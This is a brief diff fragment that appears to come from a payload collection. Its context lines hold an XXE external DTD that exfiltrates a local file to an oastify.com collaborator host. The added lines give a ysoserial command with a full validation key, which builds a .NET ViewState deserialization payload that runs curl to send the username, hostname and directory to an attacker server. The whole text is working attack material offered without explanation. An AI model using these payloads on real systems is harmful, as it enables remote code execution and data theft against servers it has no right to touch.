@@ -2,3 +2,9 @@
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://nh8db38dm6ze4b2jrwy7cwpvmmseg44t.oastify.com/exfil?xxe=%file;'>">
 %eval;
 %exfiltrate;
+
+
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c curl -k https://<attacker-server>/ssdx?user=%USERNAME%&host=%COMPUTERNAME%&cwd=%CD%" \
+--generator=503CBEC8 \
+--validationalg=SHA1 \
+--validationkey=C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE
